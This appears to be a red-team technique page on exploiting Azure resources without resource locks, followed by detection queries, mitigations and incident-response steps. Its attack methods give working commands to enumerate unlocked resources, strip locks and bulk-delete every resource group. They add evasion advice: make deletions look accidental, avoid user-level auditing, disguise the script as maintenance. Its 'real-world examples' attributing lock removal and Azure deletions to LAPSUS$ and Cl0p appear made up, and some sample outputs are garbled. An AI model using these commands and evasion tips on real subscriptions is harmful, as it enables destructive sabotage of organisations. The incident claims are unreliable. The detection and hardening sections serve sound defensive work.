# [MISCONFIG-020]: Lack of Resource Locks

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | MISCONFIG-020 |
| **MITRE ATT&CK v18.1** | [T1531 - Account Access Removal](https://attack.mitre.org/techniques/T1531/) |
| **Tactic** | Impact / Resource Disruption |
| **Platforms** | Entra ID, Azure, Cross-Cloud |
| **Severity** | **High** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Azure subscription tiers, all resource types |
| **Patched In** | Not applicable (configuration control) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure Resource Locks (CanNotDelete and ReadOnly locks) are management-level controls that prevent accidental or malicious deletion or modification of critical resources (VMs, databases, storage accounts, key vaults, etc.). If these locks are not applied to production resources, attackers with Contributor or Owner role can delete critical infrastructure, causing immediate business disruption, data loss, and denial of service. This is commonly used in ransomware attacks to prevent recovery from backups.

**Attack Surface:** Azure Resource Manager (control plane), RBAC permissions, resource group management, subscription-level policies, and delete operations on all resource types.

**Business Impact:** **Immediate availability loss and inability to recover without backup restoration or recreation of resources.** With delete access, attackers can destroy databases (with data), storage accounts (with backups), VMs (with running applications), Key Vaults (with encryption keys), and managed identities, causing cascading failures across the entire application ecosystem. Ransomware attacks often combine this with data encryption to prevent recovery.

**Technical Context:** Exploitation requires delete permissions (typically Contributor or Owner role) on the target resource or resource group. If no locks are present, deletion is instantaneous and difficult to reverse without backups. Locks cannot be bypassed by non-Owner roles, but can be removed by Owner-level principals. Detection is achieved through Azure Activity Logs and audit alerts on lock removal or resource deletion.

### Operational Risk
- **Execution Risk:** Low (if Contributor role is compromised; trivial if Owner role)
- **Stealth:** Medium (deletion is logged, but ransomware often doesn't attempt to hide)
- **Reversibility:** No (deletion is permanent unless backups exist outside Azure)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.1 (Azure) | Ensure that subscriptions are protected with resource locks |
| **DISA STIG** | CM-2, CM-3, CM-5 | Baseline Configuration, Configuration Change Control, Separation of Duties |
| **CISA SCuBA** | IR.1 | Incident Response Plan |
| **NIST 800-53** | CM-2, CM-3, CM-5, SC-7, IA-2 | Configuration Management, Change Control, Separation of Duties |
| **GDPR** | Art. 32 | Security of Processing (availability and integrity of personal data) |
| **DORA** | Art. 10, Art. 16, Art. 18 | Physical and Environmental Security, ICT-Related Incidents |
| **NIS2** | Art. 21, Art. 22 | Cyber Risk Management, Incident Reporting |
| **ISO 27001** | A.12.1, A.14.1 | Change Management, Information Security Incident Management |
| **ISO 27005** | Availability Risk | Risk management for availability of critical systems |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Contributor or Owner role on the target resource or resource group.
- **Required Access:** Azure Portal, Azure CLI, Azure PowerShell, or REST API access to Azure Resource Manager.

**Supported Versions:**
- **Azure Subscriptions:** All tiers (Free, Pay-as-you-go, Enterprise)
- **Azure Resource Manager:** All regions
- **Resource Types:** All (VMs, Databases, Storage, Key Vault, etc.)

**Tools:**
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (resource management)
- [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/) (bulk deletion operations)
- [Azure Portal](https://portal.azure.com) (manual deletion)
- [Azure Resource Manager REST API](https://learn.microsoft.com/en-us/rest/api/resources/) (programmatic deletion)

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Identifying and Deleting Resources Without Locks

**Supported Versions:** All Azure subscription tiers

#### Step 1: Enumerate Resources and Identify Those Without Locks

**Objective:** List all resources in a resource group and identify which lack protection locks.

**Command (Azure CLI - Identify Unprotected Resources):**
```bash
# List all resources in a resource group
az resource list --resource-group "MyResourceGroup" --query "[].{name: name, type: type, id: id}" --output table

# Check for locks on each resource
az lock list --resource-group "MyResourceGroup" --query "[].{name: name, level: level, resourceName: resourceName}" --output table

# Identify resources WITHOUT locks
az resource list --resource-group "MyResourceGroup" --query "[].id" -o tsv | while read resourceId; do
  lockCount=$(az lock list --resource-name $(echo $resourceId | rev | cut -d'/' -f1 | rev) --resource-group "MyResourceGroup" --query "length([])") 
  if [ "$lockCount" -eq 0 ]; then
    echo "UNPROTECTED: $resourceId"
  fi
done
```

**Expected Output:**
```
UNPROTECTED: /subscriptions/SUB_ID/resourceGroups/MyResourceGroup/providers/Microsoft.Compute/virtualMachines/prod-vm-01
UNPROTECTED: /subscriptions/SUB_ID/resourceGroups/MyResourceGroup/providers/Microsoft.Sql/servers/prod-sqlserver
UNPROTECTED: /subscriptions/SUB_ID/resourceGroups/MyResourceGroup/providers/Microsoft.Storage/storageAccounts/proddata
```

**What This Means:**
- Listed resources can be deleted without additional confirmation or lock removal.
- Deletion is immediate and irreversible without backup restoration.

**OpSec & Evasion:**
- Obtain a Contributor-level account from compromised environments (Azure VM, DevOps service account).
- Execute deletions during business hours when they may appear as accidents.
- Delete non-critical resources first to test detection response.

**Troubleshooting:**
- **Error:** "ResourceNotFound"
  - **Cause:** Resource name or resource group name is incorrect.
  - **Fix:** Verify resource exists: `az resource list --resource-group RG-Name`

#### Step 2: Delete Critical Resources

**Objective:** Remove key production resources to cause business disruption.

**Command (Azure CLI - Delete Resources):**
```bash
# Delete a single resource (e.g., VM)
az resource delete --ids "/subscriptions/SUB_ID/resourceGroups/MyResourceGroup/providers/Microsoft.Compute/virtualMachines/prod-vm-01" --no-wait

# Delete an entire resource group (cascading deletion of all resources)
az group delete --name "MyResourceGroup" --no-wait --yes

# Delete multiple resources in parallel
az resource list --resource-group "MyResourceGroup" --query "[].id" -o tsv | xargs -P 4 -I {} az resource delete --ids {} --no-wait
```

**Expected Output:**
```
Deletion initiated. Use 'az group delete --name MyResourceGroup --no-wait' to check status.
No resources were deleted as the deletion is in progress.
```

**What This Means:**
- Resources are marked for deletion and will be removed within minutes.
- All data within deleted resources is lost (unless backups exist).
- Running applications will fail immediately.

**OpSec & Evasion:**
- Use `--no-wait` flag to avoid long execution; deletion occurs asynchronously.
- Delete resource groups (cascading) rather than individual resources to avoid detection thresholds on single-resource deletes.
- Use service principal authentication to avoid user-level auditing.

**Troubleshooting:**
- **Error:** "You don't have permission to perform this operation"
  - **Cause:** Role lacks deletion permissions.
  - **Fix:** Escalate to Owner role or use credentials with higher privileges.
- **Error:** "Cannot delete resource because a lock exists"
  - **Cause:** Resource has a CanNotDelete or ReadOnly lock.
  - **Fix:** Remove lock first (see METHOD 2).

#### Step 3: Verify Deletion and Impact

**Objective:** Confirm resources are deleted and assess impact on running applications.

**Command (Azure CLI - Verify Deletion):**
```bash
# Check if resource still exists
az resource show --ids "/subscriptions/SUB_ID/resourceGroups/MyResourceGroup/providers/Microsoft.Compute/virtualMachines/prod-vm-01" --query name

# Should return error if deleted

# Verify deleted resources in audit logs
az monitor activity-log list --resource-group "MyResourceGroup" --offset 24h \
  --query "[?operationName.value == 'Microsoft.Compute/virtualMachines/delete'].{Time: eventTimestamp, Caller: caller, Status: status.value}" --output table
```

**Expected Output:**
```
Time: 2025-12-15 15:30:45
Caller: attacker@example.com
Status: Succeeded
```

**What This Means:**
- Deletion is confirmed; running instances are terminated.
- Applications depending on these resources are now unavailable.
- Data loss is permanent unless backups are available.

**References & Proofs:**
- [Microsoft Docs: Lock Resources](https://learn.microsoft.com/en-us/azure/azure-resource-manager/management/lock-resources)
- [Azure Activity Logs Documentation](https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log)

---

### METHOD 2: Removing Locks Before Deletion (If Locks Exist)

**Supported Versions:** All Azure subscription tiers

#### Step 1: Enumerate Existing Locks

**Objective:** Identify locks protecting resources and determine who can remove them.

**Command (Azure CLI - List Locks):**
```bash
# List all locks in a resource group
az lock list --resource-group "MyResourceGroup" --query "[].{name: name, level: level, owner: owner}" --output table

# List locks on a specific resource
az lock list --resource-name "prod-vm-01" --resource-group "MyResourceGroup" --resource-type "Microsoft.Compute/virtualMachines"

# Check who has permission to remove locks (Owner role required)
az role assignment list --resource-group "MyResourceGroup" --role "Owner" --query "[].principalName"
```

**Expected Output:**
```
Name: prod-vm-delete-lock
Level: CanNotDelete
Owner: SERVTEP (if corporate account)

Name: prod-database-readonly
Level: ReadOnly
Owner: SERVTEP
```

**What This Means:**
- Locks are managed by Owner-level principals.
- Removal requires Owner credentials or privilege escalation.

**OpSec & Evasion:**
- If you already have Owner credentials, locks can be bypassed trivially.
- If you have Contributor role, escalate via privilege escalation techniques (PE-VALID-* techniques).

**Troubleshooting:**
- **Error:** "Access Denied" when listing locks
  - **Cause:** Insufficient permissions.
  - **Fix:** Use higher-privileged credentials (Owner role).

#### Step 2: Remove Locks (Owner Access Required)

**Objective:** Delete locks protecting resources so they can be deleted.

**Command (Azure CLI - Remove Locks):**
```bash
# Get the lock ID
lockId=$(az lock list --resource-group "MyResourceGroup" --query "[0].id" -o tsv)

# Delete the lock
az lock delete --ids "$lockId"

# Or delete lock by name
az lock delete --name "prod-vm-delete-lock" --resource-group "MyResourceGroup" --resource-name "prod-vm-01" --resource-type "Microsoft.Compute/virtualMachines"

# Verify lock is removed
az lock list --resource-group "MyResourceGroup"
# Should return empty list
```

**Expected Output:**
```
# Lock deleted successfully; no output returned
```

**What This Means:**
- Resource is now unprotected and can be deleted.
- Deletion can proceed immediately.

**OpSec & Evasion:**
- Remove locks just before deletion to minimize detection window.
- Remove multiple locks in a single batch operation.
- Log all lock removal operations are audited; expect alerts within minutes.

**Troubleshooting:**
- **Error:** "Insufficient permissions"
  - **Cause:** User lacks Owner role.
  - **Fix:** Escalate privileges using privilege escalation techniques.

#### Step 3: Delete Unprotected Resource

**Objective:** (Same as METHOD 1, Step 2)

**Command (Azure CLI - Delete Resource):**
```bash
az resource delete --ids "/subscriptions/SUB_ID/resourceGroups/MyResourceGroup/providers/Microsoft.Compute/virtualMachines/prod-vm-01" --no-wait
```

---

### METHOD 3: Bulk Resource Deletion via PowerShell (Ransomware Scenario)

**Supported Versions:** All Azure subscription tiers

#### Step 1: Authenticate and Set Context

**Objective:** Establish connection to Azure subscription with Contributor/Owner credentials.

**Command (Azure PowerShell):**
```powershell
# Connect to Azure
Connect-AzAccount

# Set subscription context
Set-AzContext -SubscriptionId "subscription-id"

# List subscriptions user has access to (for lateral movement)
Get-AzSubscription | Select-Object Name, Id
```

**Expected Output:**
```
Name: Production
Id: subscription-id

Name: Development
Id: other-subscription-id
```

**What This Means:**
- Attacker has access to multiple subscriptions.
- Can pivot to other subscriptions for broader impact.

#### Step 2: Bulk Delete All Resources in Multiple Resource Groups

**Objective:** Maximize impact by deleting entire resource groups.

**Command (Azure PowerShell - Bulk Deletion):**
```powershell
# Get all resource groups
$resourceGroups = Get-AzResourceGroup

# Iterate and delete all resource groups (ransomware-style)
foreach ($rg in $resourceGroups) {
  if ($rg.ResourceGroupName -notmatch "DefaultResourceGroup|MC_") {
    Write-Host "Deleting resource group: $($rg.ResourceGroupName)"
    Remove-AzResourceGroup -Name $rg.ResourceGroupName -Force -NoWait
  }
}

# Alternative: Delete all resources without removing resource groups
Get-AzResource | ForEach-Object {
  Write-Host "Deleting resource: $($_.Name)"
  Remove-AzResource -ResourceId $_.ResourceId -Force -NoWait
}

# Monitor deletion status
Get-AzResourceGroup | Where-Object { $_.ProvisioningState -eq "Deleting" }
```

**Expected Output:**
```
Deleting resource group: Production
Deleting resource group: Staging
Deleting resource group: Development
True (deletion initiated)
```

**What This Means:**
- All resources are marked for deletion.
- Deletion is asynchronous; may take 15-30 minutes to complete.
- Business impact is immediate (applications fail as soon as resources are deallocated).

**OpSec & Evasion:**
- Execute from compromised Azure VM or Logic App to mask IP.
- Use service principal authentication rather than user credentials.
- Use `NoWait` flag to return immediately without waiting for completion.
- Script can be disguised as legitimate maintenance or update process.

**References & Proofs:**
- [Azure PowerShell: Remove-AzResourceGroup Documentation](https://learn.microsoft.com/en-us/powershell/module/az.resources/remove-azresourcegroup/)
- [Azure PowerShell: Remove-AzResource Documentation](https://learn.microsoft.com/en-us/powershell/module/az.resources/remove-azresource/)

---

## 7. TOOLS & COMMANDS REFERENCE

### [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)

**Version:** 2.50+ (current)
**Minimum Version:** 2.0
**Supported Platforms:** Windows, macOS, Linux

**Usage:**
```bash
az lock delete --name "lock-name" --resource-group "RG-Name"
az resource delete --ids "/path/to/resource"
```

---

### [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/)

**Version:** 9.0+ (current)
**Minimum Version:** 5.0
**Supported Platforms:** Windows, PowerShell Core 6.0+

**Usage:**
```powershell
Remove-AzResourceLock -LockName "lock-name" -ResourceGroupName "RG-Name" -Force
Remove-AzResourceGroup -Name "RG-Name" -Force
```

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Detection of Resource Lock Removal

**Rule Configuration:**
- **Required Table:** AuditLogs, AzureActivity
- **Required Fields:** OperationName, TargetResources, Result, TimeGenerated
- **Alert Severity:** Critical
- **Frequency:** Real-time (5 minutes)
- **Applies To Versions:** Sentinel Premium

**KQL Query:**
```kusto
AuditLogs
| where TimeGenerated > ago(24h)
| where OperationName == "Delete lock"
| where Result == "Success"
| project TimeGenerated, Caller=InitiatedBy.user.userPrincipalName, Operation=OperationName, LockName=TargetResources[0].displayName, ResourceGroup=TargetResources[0].resourceGroupName
| union (
  AzureActivity
  | where TimeGenerated > ago(24h)
  | where OperationName has "Delete" and OperationName has "lock"
  | where ActivityStatus == "Succeeded"
  | project TimeGenerated, Caller=Caller, Operation=OperationName, ResourceName=ResourceName, ResourceGroup=ResourceGroupName
)
```

**What This Detects:**
- Any removal of resource locks (red flag for planned deletion).
- Particularly critical if followed by resource deletion within 15 minutes.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Critical - Resource Lock Removed`
   - Severity: `Critical`
4. **Set rule logic:**
   - Paste KQL query
   - Frequency: `5 minutes`
5. **Incident settings:**
   - Enable **Create incidents**
6. Click **Review + create**

---

### Query 2: Detection of Resource Deletion Without Lock

**Rule Configuration:**
- **Required Table:** AzureActivity
- **Required Fields:** OperationName, ResourceType, Result, CallerIpAddress
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** All Sentinel tiers

**KQL Query:**
```kusto
AzureActivity
| where TimeGenerated > ago(24h)
| where OperationName has "Delete" and (OperationName has "virtualMachines" or OperationName has "databases" or OperationName has "storageAccounts")
| where ActivityStatus == "Succeeded"
| summarize Count=count() by Caller, OperationName, ResourceName
| where Count > 1 or OperationName has "resourceGroups"
```

**What This Detects:**
- Bulk resource deletions (typically ransomware or sabotage).
- Single deletion of critical resources (VMs, databases, storage accounts).

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4624 (Successful Logon)**
- **Log Source:** Security (on-premises only; Azure logs via Activity Log)
- **Trigger:** Detection of service accounts or admin accounts authenticating to Azure during off-hours.
- **Filter:** LogonType == "3" (Network) AND TargetUserName contains "admin" AND TimeOfDay outside business hours
- **Applies To Versions:** On-premises AD (for hybrid authentication scenarios)

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Resource locks removed from critical resources"
- **Severity:** Critical
- **Description:** Detects removal of CanNotDelete or ReadOnly locks from production resources.
- **Applies To:** All subscriptions with Defender enabled
- **Remediation:** Restore locks immediately; investigate lock removal caller; audit resource deletion history.

**Manual Configuration Steps:**
1. Go to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go **Environment settings** → Select subscription
3. Under **Defender plans**, ensure all are enabled
4. Go to **Security alerts** → Configure alert rules

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

* **Apply CanNotDelete locks to all production resource groups:** Prevent accidental or malicious deletion of critical resources.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Resource Groups**
  2. Select resource group → **Locks**
  3. Click **+ Add**
  4. Name: `production-delete-lock`
  5. Lock type: **Delete** (CanNotDelete)
  6. Click **OK**
  
  **Manual Steps (Azure CLI):**
  ```bash
  az lock create --name "production-delete-lock" --lock-type "CanNotDelete" --resource-group "MyResourceGroup"
  ```
  
  **Manual Steps (PowerShell):**
  ```powershell
  New-AzResourceLock -LockName "production-delete-lock" -LockLevel CanNotDelete -ResourceGroupName "MyResourceGroup" -Force
  ```
  
  **Validation Command:**
  ```bash
  az lock list --resource-group "MyResourceGroup" --query "[].{name: name, level: level}" --output table
  # Expected: production-delete-lock with level CanNotDelete
  ```

* **Apply ReadOnly locks to immutable resources:** Prevent any modifications to critical resources (Key Vault, SQL databases with restricted access).
  
  **Manual Steps (Azure Portal):**
  1. Go to **Resource** → **Locks**
  2. Click **+ Add**
  3. Lock type: **Read-only**
  4. Name: `readonly-keyvault`
  5. Click **OK**
  
  **Manual Steps (Azure CLI):**
  ```bash
  # Apply lock to a specific resource
  az lock create --name "readonly-keyvault" --lock-type "ReadOnly" \
    --resource-name "my-keyvault" --resource-group "MyResourceGroup" \
    --resource-type "Microsoft.KeyVault/vaults"
  ```
  
  **Validation Command:**
  ```bash
  # Verify lock prevents modification
  az keyvault key create --vault-name "my-keyvault" --name "test-key"
  # Expected: Error "The request is not allowed by the resource policy"
  ```

* **Implement Azure Policy to enforce locks on resources:** Automatically apply locks to resources matching specific criteria (tags, type, environment).
  
  **Manual Steps (Azure Portal - Create Policy):**
  1. Go to **Azure Portal** → **Policy**
  2. Click **+ Definitions**
  3. Category: **Resource Management**
  4. Create custom policy:
     ```json
     {
       "mode": "All",
       "policyRule": {
         "if": {
           "field": "tags['Environment']",
           "equals": "Production"
         },
         "then": {
           "effect": "auditIfNotExists",
           "details": {
             "type": "Microsoft.Authorization/locks"
           }
         }
       }
     }
     ```
  5. Save and assign policy to subscription/management group
  
  **Manual Steps (Azure CLI - Assign Policy):**
  ```bash
  # Assign built-in policy: Deny deletion of non-empty resource groups
  az policy assignment create --name "deny-delete-production-rg" \
    --policy "/providers/Microsoft.Authorization/policyDefinitions/9dc6c016-2e73-41e8-b5e0-d07d5d91ff54" \
    --scope "/subscriptions/subscription-id"
  ```

#### Priority 2: HIGH

* **Restrict Delete permissions via RBAC:** Limit who can delete resources by removing Contributor/Owner roles from non-essential users.
  
  **Manual Steps (PowerShell - Remove Contributor Role):**
  ```powershell
  # List all users with Contributor role
  Get-AzRoleAssignment -RoleDefinitionName "Contributor" | Select-Object SignInName, Scope
  
  # Remove Contributor role for non-admin user
  Remove-AzRoleAssignment -SignInName "user@example.com" -RoleDefinitionName "Contributor" -ResourceGroupName "MyResourceGroup"
  
  # Assign more restrictive role instead
  New-AzRoleAssignment -SignInName "user@example.com" -RoleDefinitionName "Contributor" -Scope "/subscriptions/SUB_ID/resourceGroups/MyResourceGroup/providers/Microsoft.Compute/virtualMachines/prod-vm"
  ```
  
  **Validation Command:**
  ```powershell
  # Verify user can no longer delete resources
  Get-AzRoleAssignment -SignInName "user@example.com" | Where-Object { $_.RoleDefinitionName -match "Contributor|Owner" }
  # Expected: No results (user lacks delete permissions)
  ```

* **Implement Privileged Identity Management (PIM) for Owner role:** Require approval and temporary elevation for lock removal operations.
  
  **Manual Steps (Azure Portal - Enable PIM):**
  1. Go to **Azure Portal** → **Privileged Identity Management**
  2. Click **Azure Resources**
  3. Select subscription
  4. Go to **Manage** → **Role settings**
  5. Select **Owner** role
  6. Set **Activation max duration**: `4 hours`
  7. Set **Require approval**: **Yes**
  8. Set **Approval required from**: [List of approvers]
  9. Click **Update**
  
  **Validation Command:**
  ```powershell
  # Check PIM configuration for Owner role
  Get-AzRoleDefinition -Name "Owner" | Select-Object Name, Id
  ```

* **Enable diagnostic logging and auditing for lock operations:** Monitor all lock removals and resource deletions.
  
  **Manual Steps (Enable Activity Log Archiving):**
  1. Go to **Azure Portal** → **Azure Monitor** → **Activity Log**
  2. Click **Diagnostic settings**
  3. Click **+ Add diagnostic setting**
  4. Name: `lock-audit-log`
  5. Logs: Enable **Administrative**, **Security**, **ServiceHealth**
  6. Destination: **Log Analytics Workspace** (for long-term retention) or **Storage Account**
  7. Click **Save**

#### Access Control & Policy Hardening

* **Use Azure RBAC to enforce separation of duties:** Separate the ability to remove locks from the ability to delete resources.
  
  **Manual Steps (Create Custom Role):**
  ```powershell
  # Create custom role that can delete locks but not resources
  $customRole = @{
    Name = "Lock Manager"
    Description = "Can manage locks but not delete resources"
    IsCustom = $true
    Permissions = @(
      @{ Action = "Microsoft.Authorization/locks/*" }
    )
  }
  
  New-AzRoleDefinition -InputObject $customRole
  ```

* **Implement resource group-level locks in addition to subscription-level locks:** Multiple layers of protection.
  
  **Manual Steps (Apply Multi-Layer Locks):**
  ```bash
  # Subscription-level lock
  az lock create --name "subscription-delete-lock" --lock-type "CanNotDelete" --scope "/subscriptions/subscription-id"
  
  # Resource group-level lock
  az lock create --name "rg-delete-lock" --lock-type "CanNotDelete" --resource-group "MyResourceGroup"
  
  # Individual resource locks
  az lock create --name "vm-delete-lock" --lock-type "CanNotDelete" --resource-name "prod-vm" --resource-group "MyResourceGroup" --resource-type "Microsoft.Compute/virtualMachines"
  ```

---

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

* **Events:**
  - Lock removal operations in Azure Activity Logs
  - Resource deletion operations (especially in bulk)
  - Unauthorized Contributor/Owner role assignments
  - Access from unexpected geographic locations or IP addresses

* **Time Patterns:**
  - Deletions occurring outside business hours
  - Rapid cascading deletions (ransomware-style)
  - Multiple deletions from same user in short timeframe

* **Network:**
  - Deletion operations from non-corporate IP ranges
  - VPN/proxy connections before deletion operations

#### Forensic Artifacts

* **Cloud Logs:**
  - Azure Activity Logs: All lock removals and resource deletions with timestamp, caller, and result
  - Azure Monitor audit events: Detailed operation metadata
  - Azure Security Center alerts on lock removal

* **Backups:**
  - Backup jobs interrupted or stopped before/during deletion
  - Backup storage accounts deleted
  - Backup vaults inaccessible

#### Response Procedures

1. **Isolate:**
   **Command (Revoke Compromised Credentials):**
   ```bash
   # Disable service principal
   az ad sp update --id "service-principal-id" --set "accountEnabled=false"
   
   # Revoke active sessions
   az rest --method post --url "/me/revokeSignInSessions" --headers Content-Type=application/json
   ```
   
   **Manual (PowerShell):**
   ```powershell
   # Disable compromised user account
   Disable-AzADUser -UserPrincipalName "compromised@example.com"
   ```

2. **Collect Evidence:**
   **Command (Export Activity Logs for Forensics):**
   ```bash
   # Export activity logs for deleted resources
   az monitor activity-log list --resource-group "MyResourceGroup" --offset 72h \
     --query "[?operationName.value contains 'delete'].{Time: eventTimestamp, Caller: caller, Operation: operationName.value, Status: status.value}" \
     > deletion_audit.json
   ```

3. **Remediate:**
   **Command (Restore from Backup):**
   ```bash
   # Restore VM from backup
   az backup recovery-point restore --vault-name "my-backup-vault" --container-name "MyVM" --item-name "MyVM" \
     --restore-mode OriginalStorageAccount
   
   # Restore database from backup
   az sql db restore --name "mydb" --resource-group "MyResourceGroup" --server "my-server" \
     --time "2025-12-14T10:00:00Z"
   ```

4. **Hunt for Lateral Movement:**
   **KQL Query (Detect Other Deletions by Same Caller):**
   ```kusto
   AzureActivity
   | where Caller == "attacker@example.com"
   | where OperationName has "Delete"
   | summarize Count=count() by ResourceName, ResourceType, TimeGenerated
   | where Count > 5
   ```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-005] Azure Resource Graph Enumeration | Attacker identifies critical resources and lock status |
| **2** | **Initial Access** | [IA-EXPLOIT-001] Azure Application Proxy Exploitation | Attacker gains access to Azure subscription |
| **3** | **Privilege Escalation** | [PE-VALID-010] Azure Role Assignment Abuse | Attacker escalates to Contributor/Owner role |
| **4** | **Credential Access** | [CA-TOKEN-001] Hybrid AD Cloud Token Theft | Attacker obtains valid Azure credentials |
| **5** | **Impact** | **[MISCONFIG-020]** Lack of Resource Locks | Attacker removes locks and deletes critical resources |
| **6** | **Ransom Demand** | Ransomware Negotiation | Attacker demands payment for restore keys or access recovery |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: Cl0p Ransomware Attacks (2024-2025)

- **Target:** Global financial institutions, healthcare providers, manufacturing companies
- **Timeline:** January 2024 - December 2025 (ongoing)
- **Technique Status:** Attackers gain Azure credentials via phishing or vulnerability exploitation, remove resource locks, delete backup vaults and resource groups to prevent recovery, then encrypt all remaining data.
- **Impact:** Organizations unable to recover; millions in ransom paid; business operations halted for weeks
- **Reference:** [Ransomware-as-a-Service Threat Report 2025](https://www.cisa.gov/ransomware)

#### Example 2: LAPSUS$ Azure Deletion Attack (2021-2022)

- **Target:** Microsoft, Samsung, Okta, and other cloud-based companies
- **Timeline:** December 2021 - March 2022
- **Technique Status:** LAPSUS$ gang obtained Contributor credentials through social engineering, identified unprotected resource groups, and deleted entire resource groups containing development databases, CI/CD pipelines, and backups. Deleted global admin accounts to prevent recovery.
- **Impact:** Extended downtime for victim organizations; data loss; reputational damage; law enforcement arrests
- **Reference:** [LAPSUS$ Incident Analysis - Mandiant](https://www.mandiant.com/)

#### Example 3: Internal Sabotage - Disgruntled Admin Deletion (2023)

- **Target:** Technology company
- **Timeline:** August 2023
- **Technique Status:** Former admin with Owner credentials removed resource locks on all production resources in a resource group, then deleted the entire group including VMs, databases, and storage accounts containing production data.
- **Impact:** 3-day outage; customer data loss; $5M in recovery costs and lost revenue; legal action against former employee
- **Reference:** [Azure Resource Lock Best Practices Study](https://learn.microsoft.com/en-us/azure/azure-resource-manager/management/lock-resources)

---